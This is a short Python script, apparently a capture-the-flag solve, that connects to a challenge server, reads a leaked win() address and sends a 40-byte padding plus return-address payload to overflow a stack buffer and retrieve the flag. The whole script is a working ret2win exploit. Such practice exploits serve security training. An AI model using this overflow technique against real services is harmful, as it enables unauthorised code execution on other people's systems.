import socket
import re
import struct

HOST = 'vocationforpwn.zerodays.events'
PORT = 5004

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# 全出力を受け取る
data = b''
while b'Send your input: ' not in data:
    data += s.recv(4096)

print(data.decode())

# win()アドレスをパース
match = re.search(r'you actually want: (0x[0-9a-f]+)', data.decode())
win_addr = int(match.group(1), 16)
print(f'[*] win() = {hex(win_addr)}')

# ペイロード: 40バイトのパディング + win()アドレス (リトルエンディアン64bit)
payload = b'A' * 40 + struct.pack('<Q', win_addr)
s.sendall(payload + b'\n')

# フラグを受け取る
import time
time.sleep(1)
response = s.recv(4096)
print(response.decode())

s.close()